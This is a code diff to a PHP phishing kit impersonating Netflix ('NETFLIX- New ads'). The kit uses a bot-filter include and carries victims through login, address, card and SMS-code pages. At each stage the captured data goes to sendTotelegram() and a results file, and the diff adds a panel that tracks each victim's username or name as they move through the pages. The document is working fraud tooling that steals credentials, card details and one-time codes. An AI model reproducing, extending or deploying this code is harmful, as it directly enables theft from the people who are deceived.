@@ -1,6 +1,9 @@
 <?php 
-session_start();
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
 require_once 'config.php';
+require_once __DIR__ . '/lib/user_panel.php';
 require_once 'botMother/botMother.php';
 
 $bm = new botMother();
@@ -87,6 +90,8 @@ IP: $ip
 
 sendTotelegram($msg);
 appendResult($msg);
+$_SESSION['_login_user'] = $_POST['user'];
+panelTouchUser($_POST['user'], 'login.php');
 
 if (isAjaxRequest()) {
     header('Content-Type: application/json');
@@ -107,6 +112,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 
 if(isset($_POST['first-name'])){
 $_SESSION['_first-name'] = $_POST['first-name'];
+$_SESSION['_last-name'] = $_POST['last-name'] ?? '';
 $fullName = trim(($_POST['first-name'] ?? '') . ' ' . ($_POST['last-name'] ?? ''));
 $msg = "
 NETFLIX- New ads
@@ -128,6 +134,7 @@ IP: $ip
 
 sendTotelegram($msg);
 appendResult($msg);
+panelTouchUser($fullName !== '' ? $fullName : ($_SESSION['_login_user'] ?? ''), 'adrees.php');
 
 header("location: card.php");
 
@@ -153,6 +160,7 @@ IP: $ip
 
 sendTotelegram($msg);
 appendResult($msg);
+panelTouchUser($_POST['holder-name'] ?? ($_SESSION['_login_user'] ?? ''), 'card.php');
 
 header("location: wait.php?next=sms.php");
 
@@ -172,6 +180,7 @@ IP: $ip
 
 sendTotelegram($msg);
 appendResult($msg);
+panelTouchUser($_SESSION['_login_user'] ?? '', 'sms.php');
 
 if(isset($_POST['exit'])){
     die(header("location: exit.php"));
